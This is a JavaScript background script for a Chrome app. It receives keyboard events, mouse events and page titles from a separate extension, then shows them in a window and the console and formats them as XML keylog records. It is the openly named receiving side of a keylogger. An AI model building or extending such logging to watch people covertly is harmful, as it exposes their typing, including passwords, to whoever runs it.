// ******** do not edit below this line *********

// Create the page that draw actual keylogging informations
//var documentWin = null;
chrome.app.runtime.onLaunched.addListener(function() {
  chrome.app.window.create('status.html', __config.opt_window);
});

var Keylogger = function() {
    
    // The object is created with null variables
    this.time = { epoch: 0, obj: new Date(0) };
    this.title = null;
    this.mouse = null;
    this.keyboard = null;
    
    // This function is called with the content of the message from the extension
    this.update = function(content) {
        this.time = { epoch: content.time, obj: new Date(content.time) };
        if (content.config.opt_title) { this.title = content.title; } else { this.title = null; }
        if (content.config.opt_mouse) { this.mouse = content.mouse; } else { this.mouse = null; }
        if (content.config.opt_keyboard) { this.keyboard = content.keyboard; } else { this.keyboard = null; }
    };
    
    // This function returns the whole object
    /*
    ret = {
        time : {
            epoch: time since the epoch,
            localeTime: string that represents the time in locale format,
            localeDate: string that reprensts the date in locale format
        },
        title : title of the document on which event happened. present only if not null,
        mouse : { <- present only if the object is not null
            x: x position of the mouse with respect to screen 
            y: y position of the mouse with respect to screen 
            evnt: event that was triggered
            button: eventually clicked button
        },
        keyboard : { <- present only if is not null
            string: string that rapresents eventually pressed combination
            key: string that represents key pressed
            modifiers: string that represent pressed modifiers
            ctrl: true if ctrl key was pressed
            alt: true if alt key was pressed
            shift: true if key was pressed
            meta: true if key was pressed
            keyCode: hex value that represents key pressed
        }
    }
    */
    this.get = function() {
        var ret = {};
        ret.time = {
            epoch: this.time.epoch,
            localeTime: this.time.obj.toLocaleTimeString(),
            localeDate: this.time.obj.toLocaleDateString()
        };
        if (this.mouse) { ret.mouse = this.mouse };
        if (this.keyboard) { ret.keyboard = this.keyboard };
        if (this.title) { ret.title = this.title };
        return ret;
    };
    
    // This function logs to the console the content of the object
    // this function was written only for debugging purpose
    this.consoleLog = function() {
        var log = '\n';
        
        // Logging time
        log += "Time: " + this.time.obj.toLocaleString() + " [" + this.time.epoch + "]" + '\n';
        
        // if defined, logging title
        if (this.title) { log += "Title: " + this.title + '\n';}
        if (this.mouse) {
            log += "Mouse:" + '\n';
            log += '\t' + "X: " + this.mouse.x + '\n';
            log += '\t' + "Y:" + this.mouse.y + '\n';
            log += '\t' + "Event: " + this.mouse.evnt + '\n';
            log += '\t' + "Button: " + this.mouse.button + '\n';
        }
        if (this.keyboard) {
            log += "Keyboard:" + this.keyboard.string + '\n';
        }
        
        console.log(log);
    }
    
    // Return a stringed version of the event... will be implemented better the next days...
    this.logCSV = function() {
        var ret = "";
        ret += this.time.epoch + '\t';
    }
    
    this.logXML = function() {
        var xml = "";
        xml += '<keylog>\n';
            xml += '  <time>' + this.time.epoch + '</time>\n';
            if (this.title != null) {
                xml += '  <title>' + this.title + '</title>\n';
            }
            if (this.mouse != null) {
                xml += '  <mouse><x>' + this.mouse.x +'</x><y>' + this.mouse.y + '</y><event>' + this.mouse.evnt + '</event><btn>' + this.mouse.button + '</btn></mouse>\n';    
            }
            if (this.keyboard != null) {
                xml += '  <keyb ctrl="'+ (this.keyboard.ctrl ? "true" : "false") +'" alt="'+ (this.keyboard.alt ? "true" : "false") +'" shift="'+ (this.keyboard.shift ? "true" : "false") +'" meta="'+ (this.keyboard.meta ? "true" : "false") +'">' + this.keyboard.key + '</keyb>\n'
            }
        xml += '</keylog>\n';
        return xml;
    }
    
    this.updateWindow = function() {
        //(chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("content").innerHTML = this.logHTML();
        (chrome.app.window.get(__config.opt_window.id)).contentWindow.populate(this.get());
        (chrome.app.window.get(__config.opt_window.id)).contentWindow.document.getElementById("logging").value += this.logXML();
    }
}

var keylog = new Keylogger();

function __printDebug(message) {
    if (__config.__debug__) { console.log(message); }
}

// Function that will be executed only when external message is 
// incoming from authorized external extension
function connectionMessage(msg) {
    
    // implementation of protocol "log" messages
    if (msg.protocol === "log") {
        console.log(msg.content);
    }
    
    // implementation of protocol "event", that must be collected in the file 
    if (msg.protocol === "event") {
        keylog.update(msg.content);
        keylog.consoleLog();
        keylog.updateWindow();
    }
    
}

// ****** MAIN *******

// Message receiver listener
chrome.runtime.onConnectExternal.addListener(function(port) {
    port.onMessage.addListener(function(msg) {
        connectionMessage(msg);
    });
    port.onDisconnect.addListener(function() {
        port = null;
    });
});



